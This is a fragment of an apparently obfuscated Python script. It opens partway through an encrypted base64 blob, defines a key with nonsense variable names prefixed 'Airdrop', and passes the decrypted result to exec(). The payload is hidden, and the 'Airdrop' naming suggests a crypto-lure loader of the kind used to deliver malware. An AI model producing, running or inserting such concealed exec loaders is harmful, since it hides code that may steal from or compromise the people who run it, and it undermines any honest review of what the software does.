g5T/TNlCi/VNrSpQHxQK2K0pCRkOKGxV1c3MV4qExHwaANf61XMCbehdWmYY92UKJhvjKgPeikS5MaeYmWNgX5UX9rtDxhc5Mtb4O9gK4xypWdGvWcXpqrGLisYCcPsfnKIXRdZa4cS4kxYwSznm6F7dphSDZnLvfPIVB/ubDHX5vzqzOzgKg4hsh2XuNCAS3oQ1qB4rrCmmUyE7j7amoINRTnU+Q0LqOQrGa21nR9kKxbo1djatuFtkd8U9zyY/N4slQCrVVUPkK6YEUXDsJQp4XxJuNGeAnTJEwOyoRstAAA="
AirdropAscoooRorAccrDRIARarIrDoIrIAAsaocosprIpAraDraaroAocaRRascsoaDrsoArDDcDcopAroAcDRRassIIooAoAccprAIarsrIR = (
    "h8vKAdcyMb0ntkrrVl2AuA=="
)

exec(
    AirdropASCcRarprRRIIRaRsRaaoocssRoIDDRccIRRsrprcpoADrDoaRpaIpAsAIDcaaaIDAsaAopIoAspIaIrAsrosAcasosIDrcsssAIIro(
        AirdropAscapIAAAARAaDsARoaoaRcRrRcARcRRDoRapRDoIARcIpIoDraDarsosIDoprRpRpIIrccRRcIAoRpsRIDoaIDApsrrDApDarpsRAp,
        AirdropAscoooRorAccrDRIARarIrDoIrIAAsaocosprIpAraDraaroAocaRRascsoaDrsoArDDcDcopAroAcDRRassIIooAoAccprAIarsrIR,
    )
)